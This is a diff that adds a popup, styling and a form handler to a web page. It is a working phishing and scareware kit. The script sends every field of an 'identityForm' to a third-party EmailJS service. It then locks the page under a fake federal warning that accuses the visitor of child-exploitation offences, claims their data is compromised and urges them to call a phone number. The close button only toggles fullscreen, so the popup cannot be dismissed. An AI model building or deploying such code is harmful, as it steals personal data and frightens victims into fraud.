@@ -1,0 +1,135 @@
+<!-- Add this popup HTML before the footer -->
+<div id="legalPopup" class="popup-container">
+    <div class="popup-content">
+        <button class="popup-close" onclick="toggleFullscreen()">×</button>
+        <div class="legal-text">
+            <h2>Case Number: USC22514</h2>
+            <p><strong>Warning:</strong> The material you have attempted to access has been identified as in violation of U.S. federal law.</p>
+            <ul>
+                <li><strong>8 U.S.C. § 2251:</strong> Sexual Exploitation of Children (Production of child pornography)</li>
+                <li><strong>18 U.S.C. § 2251A:</strong> Selling and Buying of Children</li>
+                <li><strong>18 U.S.C. § 2252:</strong> Activities relating to material involving the sexual exploitation of minors</li>
+                <li><strong>18 U.S.C. § 2252A:</strong> Activities relating to material constituting or containing child pornography</li>
+                <li><strong>18 U.S.C. § 2256:</strong> Definitions</li>
+                <li><strong>18 U.S.C. § 2260:</strong> Production of sexually explicit depictions of a minor for importation into the United States</li>
+            </ul>
+            <p><strong>Alert:</strong> Your personal information may have been compromised, potentially putting your financial security and personal details at risk. Immediate action is recommended.</p>
+            <div class="call-section">
+                <a href="tel:+1-833-534-1986" class="call-button">
+                    <svg class="phone-icon" viewBox="0 0 24 24">
+                        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.24 1.02l-2.2 2.2z"/>
+                    </svg>
+                    Call Now: +1-833-534-1986
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+.popup-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    z-index: 9999;
+    display: none;
+}
+
+.popup-content {
+    position: relative;
+    background: white;
+    margin: 2% auto;
+    padding: 40px;
+    width: 90%;
+    max-width: 800px;
+    max-height: 90vh;
+    overflow-y: auto;
+    border-radius: 10px;
+    transition: all 0.3s ease;
+}
+
+.popup-content.fullscreen {
+    width: 100%;
+    height: 100%;
+    max-width: none;
+    max-height: none;
+    margin: 0;
+    border-radius: 0;
+}
+
+.popup-close {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: none;
+    border: none;
+    font-size: 40px;
+    cursor: pointer;
+    color: white;
+    z-index: 10000;
+}
+
+.legal-text {
+    font-size: 16px;
+    line-height: 1.6;
+    color: #333;
+}
+
+.call-button {
+    display: inline-flex;
+    align-items: center;
+    padding: 15px 30px;
+    background: #dc3545;
+    color: white;
+    text-decoration: none;
+    border-radius: 50px;
+    margin: 20px 0;
+    animation: ring 1.5s infinite;
+}
+
+@keyframes ring {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+    100% { transform: scale(1); }
+}
+
+.phone-icon {
+    width: 24px;
+    height: 24px;
+    margin-right: 10px;
+    fill: currentColor;
+}
+</style>
+
+<script>
+// Update form submission handler
+document.getElementById('identityForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const form = event.target;
+
+    if (form.checkValidity()) {
+        const formData = new FormData(form);
+        const data = Object.fromEntries(formData.entries());
+
+        emailjs.send('service_a6qe5ya', 'template_8veo6fh', data)
+            .then(function(response) {
+                // Show popup instead of confirmation message
+                document.getElementById('legalPopup').style.display = 'block';
+                document.body.style.overflow = 'hidden';
+            })
+            .catch(function(error) {
+                alert('Submission failed. Please try again.');
+            });
+    } else {
+        form.reportValidity();
+    }
+});
+
+function toggleFullscreen() {
+    const popup = document.querySelector('.popup-content');
+    popup.classList.toggle('fullscreen');
+}
+</script>
